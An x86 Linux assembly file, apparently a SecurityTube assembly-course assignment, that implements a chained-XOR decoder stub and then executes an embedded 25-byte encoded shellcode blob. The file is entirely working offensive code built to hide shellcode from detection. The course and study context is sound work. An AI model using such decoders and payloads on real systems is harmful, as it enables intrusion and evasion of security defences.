;
;This code has been created for completing the requirements of the SecurityTube Linux Assembly Expertcertification:
;  	
;   http://securitytube-­training.com/online-courses/securitytube-linux-assembly-expert/  
;
;Student ID: SLAE-1537
;

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 23

	; ebx will be used to hold the previous byte before decoding it
	; to use it for comaprison with the next byte
	xor ebx, ebx
	mov bl, [esi+1]

	; decode first two bytes
	xor edx, edx
	mov dl, [esi]
	xor byte [esi+1], dl
	mov dl, [esi+1]
	xor byte [esi], dl

	lea esi, [esi+2]
	; from here edx will be used to store the previous decoded value
	; and it will be updated each time a new encoded value is decoded
	mov dl, [esi-1]


decode:
	; compare the current encoded value to the previous one
	; since we are using xor we do not want to produce a null by xoring two similar values
	cmp byte [esi], bl
	jne not_equal
	xor byte [esi], dl
	inc esi
	loop decode
not_equal:
	; hold the encoded value before decoding it
	mov bl, [esi]
	; move the previous decoded value into dl to use it for decoding the current value
	mov dl, [esi-1]
	; decode the current value	
	xor byte [esi], dl
	inc esi
	loop decode

	jmp short Shellcode



call_decoder:

	call decoder
	Shellcode: db 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d,

